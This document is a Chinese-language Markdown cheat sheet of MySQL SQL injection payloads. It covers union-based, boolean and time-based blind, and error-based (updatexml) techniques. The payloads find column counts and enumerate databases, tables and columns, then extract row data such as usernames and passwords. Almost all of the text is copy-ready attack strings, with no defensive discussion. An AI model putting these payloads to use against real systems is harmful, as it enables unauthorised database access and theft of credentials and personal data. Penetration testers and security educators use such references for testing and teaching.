### 联合查询注入

#### 判断列数方法

```mysql
order by 3
union select null,null,null ...
union select 1,2,3  ...

以上Payload持续往后递增至报错，例如: 
union select null,null,null,null 我们输入4个null值时报错，得以判断列数为3
```

#### 获取当前数据库名

```mysql
union select null,group_concat(database()),NULL
union select 1,group_concat(database()),3
union select null,database(),null
union select 1,database(),3
```

#### 获取当前数据库用户

```mysql
union select null,group_concat(user()),NULL
union select 1,group_concat(user()),3
union select null,user(),null
union select 1,user(),3
```

#### 获取MySQL版本

```mysql
union select null,group_concat(version()),NULL
union select 1,group_concat(version()),3
union select null,version(),null
union select 1,version(),3
```

#### 获取所有数据库名称

```mysql
UNION ALL SELECT null,group_concat(schema_name),null FROM information_schema.schemata
UNION ALL SELECT NULL,CONCAT(0x7e,JSON_ARRAYAGG(CONCAT_WS('',schema_name)),0x7e),NULL FROM INFORMATION_SCHEMA.SCHEMATA
```

#### 获取所有表名

```mysql
UNION ALL SELECT null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema=数据库名
UNION ALL SELECT NULL,CONCAT(0x7e,JSON_ARRAYAGG(CONCAT_WS('',table_name)),0x7e),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=数据库名

Payload末尾的数据库名是指要查询的数据库名称，可以输入 database() 查询当前的数据库 或 '数据库名'
还有一种方式就是将数据库名转换为16进制，然后输入 0x16进制的数据库名
```

#### 获取所有字段名

```mysql
UNION ALL SELECT null,group_concat(column_name),null FROM information_schema.columns WHERE table_schema=数据库名 and table_name=表名
UNION ALL SELECT NULL,CONCAT(0x7e,JSON_ARRAYAGG(CONCAT_WS('',column_name)),0x7e),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=数据库名 and table_name=表名
```

#### 获取数据内容

```mysql
union select null,group_concat(id,0x7e,username,0x7e,password),null from 数据库名.表名
```

------

### 盲注

#### 1.布尔盲注

##### 判断数据库数量

```mysql
AND ((SELECT COUNT(schema_name) FROM information_schema.schemata)=1)
```

##### 判断数据库名长度

```mysql
AND ((SELECT LENGTH(database()))=7)  //判断当前数据库名长度
AND ((SELECT LENGTH(schema_name) FROM information_schema.schemata limit 第x个数据库,1)=7) //判断其他数据库名长度
```

##### 判断数据库名

```mysql
AND ((SELECT ASCII(SUBSTR(database(),第x位,1))=98))//判断当前数据库名第一位
AND ((SELECT ASCII(SUBSTR(schema_name,第x位,1)) FROM information_schema.schemata limit 第x个数据库,1)=ascii码) //判断其他数据库名
```

##### 判断数据库表的数量

```mysql
AND ((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='数据库名')=1)
```

##### 判断表名长度

```mysql
AND ((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='数据库名' limit 第x个表,1)=7)
```

##### 判断表名

```mysql
AND ((SELECT ASCII(SUBSTR(table_name,第x位,1)) FROM information_schema.tables WHERE table_schema='数据库名' limit 第x个表,1)=ascii码)
```

##### 判断表中的字段数量

```mysql
AND ((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='表名' and table_schema='数据库名')=1)
```

##### 判断字段长度

```mysql
AND ((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='表名' and table_schema='数据库名' limit 第x个字段,1)=2)
```

##### 判断字段名

```mysql
AND ((SELECT ASCII(SUBSTR(column_name,第x位,1)) FROM information_schema.columns WHERE table_name='表名' and table_schema='数据库名' limit 第x个字段,1)=ascii码)
```

##### 判断数据数量

```mysql
AND ((SELECT COUNT(字段名) FROM 数据库名.表名)=1)
```

##### 判断数据内容长度

```mysql
AND ((SELECT LENGTH(字段名) FROM 数据库名.表名 limit 第x条数据,1)=4)
```

##### 判断数据内容

```mysql
AND ((SELECT ASCII(SUBSTR(字段名,第x位,1)) FROM 数据库名.表名 limit 第x条数据,1)=ascii码)
```

#### 2.时间盲注

##### 判断数据库数量

```mysql
AND IF((SELECT COUNT(schema_name) FROM information_schema.schemata)=1,sleep(2),0)
```

##### 判断数据库名长度

```mysql
AND IF((SELECT LENGTH(database()))=7,sleep(2),0)
AND IF((SELECT LENGTH(schema_name) FROM information_schema.schemata limit 第x个数据库,1)=7,sleep(2),0)
```

##### 判断数据库名

```mysql
AND IF((SELECT ASCII(SUBSTR(database(),第x位,1))=98),sleep(2),0)
AND IF((SELECT ASCII(SUBSTR(schema_name,第x位,1)) FROM information_schema.schemata limit 第x个数据库,1)=ascii码,sleep(2),0)
```

##### 判断数据库表的数量

```mysql
AND IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='数据库名')=2,sleep(2),0)
```

##### 判断表名长度

```mysql
AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='数据库名' limit 第x个表,1)=7,sleep(2),0)
```

##### 判断表名

```mysql
AND IF((SELECT ASCII(SUBSTR(table_name,第x位,1)) FROM information_schema.tables WHERE table_schema='数据库名' limit 第x个表,1)=ascii码,sleep(2),0)
```

##### 判断表中的字段数量

```mysql
AND IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='表名' and table_schema='数据库名')=3,sleep(2),0)
```

##### 判断字段长度

```mysql
AND IF((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='表名' and table_schema='数据库名' limit 第x个字段,1)=2,sleep(2),0)
```

##### 判断字段名

```mysql
AND IF((SELECT ASCII(SUBSTR(column_name,第x位,1)) FROM information_schema.columns WHERE table_name='表名' and table_schema='数据库名' limit 第x个字段,1)=ascii码,sleep(2),0)
```

##### 判断数据数量

```mysql
AND IF((SELECT COUNT(字段名) FROM 数据库名.表名)=1,sleep(2),0)
```

##### 判断数据内容长度

```mysql
AND IF((SELECT LENGTH(字段名) FROM 数据库名.表名 limit 第x条数据,1)=1,sleep(2),0)
```

##### 判断数据内容

```mysql
AND IF((SELECT ASCII(SUBSTR(字段名,第x位,1)) FROM 数据库名.表名 limit 第x条数据,1)=ascii码,sleep(2),0)
```

------

### 报错注入

#### 获取当前数据库名

```mysql
updatexml(null,concat(0x7e,(select database()),0x7e),null)
```

#### 获取数据库数量

```mysql
updatexml(1,concat(0x7e,(SELECT(COUNT(schema_name))FROM(information_schema.schemata)),0x7e),1)
```

#### 获取数据库名长度

```mysql
updatexml(1,concat(0x7e,(SELECT(LENGTH(schema_name))FROM(information_schema.schemata) limit 第x个数据库,1),0x7e),1)
```

#### 获取数据库名

```mysql
updatexml(1,concat(0x7e,(SELECT(CONCAT(schema_name))FROM(information_schema.schemata) limit 第x个数据库,1),0x7e),1)
```

#### 获取数据库名ASCII码

```mysql
updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(schema_name,第x位,1)))FROM(information_schema.schemata) limit 第x个数据库,1),0x7e),1)
```

#### 获取数据库中表的数量

```mysql
updatexml(1,concat(0x7e,(SELECT(COUNT(table_name))FROM(information_schema.tables)WHERE(table_schema='数据库名')),0x7e),1)
```

#### 获取表名长度

```mysql
updatexml(1,concat(0x7e,(SELECT(LENGTH(table_name))FROM(information_schema.tables)WHERE(table_schema='数据库名') limit 第x个表,1),0x7e),1)
```

#### 获取表名

```mysql
updatexml(1,concat(0x7e,(SELECT(CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema='数据库名') limit 第x个表,1),0x7e),1)
```

#### 获取表名ASCII码

```mysql
updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(table_name,第x位,1)))FROM(information_schema.tables)WHERE(table_schema='数据库名') limit 第x个数表,1),0x7e),1)
```

#### 获取字段数量

```mysql
updatexml(1,concat(0x7e,(SELECT(COUNT(column_name))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名')),0x7e),1)
```

#### 获取字段长度

```mysql
updatexml(1,concat(0x7e,(SELECT(LENGTH(column_name))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名') limit 第x个字段,1),0x7e),1)
```

#### 获取字段名

```mysql
updatexml(1,concat(0x7e,(SELECT(CONCAT(column_name))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名') limit 第x个字段,1),0x7e),1)
```

#### 获取字段名ASCII码

```mysql
updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(column_name,第x位,1)))FROM(information_schema.columns)WHERE(table_schema='数据库名')AND(table_name='表名') limit 第x个字段,1),0x7e),1)
```

#### 获取数据数量

```mysql
updatexml(1,concat(0x7e,(SELECT(COUNT(字段名))FROM(数据库名.表名)),0x7e),1)
```

#### 获取数据内容长度

```mysql
updatexml(1,concat(0x7e,(SELECT(LENGTH(字段名))FROM(数据库名.表名) limit 第x条数据,1),0x7e),1)
```

#### 获取数据内容

```mysql
updatexml(1,concat(0x7e,(SELECT(CONCAT(字段名))FROM(数据库名.表名) limit 第x条数据,1),0x7e),1)
```

#### 获取数据内容ASCII码

```mysql
updatexml(1,concat(0x7e,(SELECT(ASCII(SUBSTR(字段名,第x位,1)))FROM(数据库名.表名) limit 第x条数据,1),0x7e),1)
```

